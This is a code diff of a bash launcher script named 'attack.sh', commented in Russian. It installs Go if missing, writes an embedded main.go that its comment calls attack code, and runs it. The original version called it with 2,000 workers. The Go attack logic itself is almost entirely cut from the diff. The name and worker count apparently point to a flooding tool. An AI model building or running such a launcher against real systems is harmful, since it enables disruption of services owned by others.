@@ -1,22 +1,21 @@
-cat > attack.sh << 'EOF'
 #!/bin/bash
 set -e
 
-# Установка Go, если отсутствует
+# Установка Go, если нет
 if ! command -v go &> /dev/null; then
-    echo "Go не найден, устанавливаю..."
+    echo "Устанавливаю Go..."
     wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
     sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
     export PATH=$PATH:/usr/local/go/bin
     echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 fi
 
-# Создаём временную директорию
+# Создаём временную папку
 WORKDIR=$(mktemp -d)
-cd $WORKDIR
+cd "$WORKDIR"
 
-# Пишем main.go
-cat > main.go << 'GOLANG'
+# Пишем main.go (встраиваем код атаки)
+cat > main.go << 'EOF'
 package main
 
 import (
@@ -193,13 +192,9 @@ func randInt(min, max int) (int, error) {
 	}
 	return int(n.Int64()) + min, nil
 }
-GOLANG
-
-# Запускаем
-go mod init attack
-go mod tidy
-go run main.go "$@"
 EOF
 
-chmod +x attack.sh
-./attack.sh -workers 2000
+# Запускаем
+go mod init attack 2>/dev/null || true
+go mod tidy 2>/dev/null || true
+go run main.go "$@"
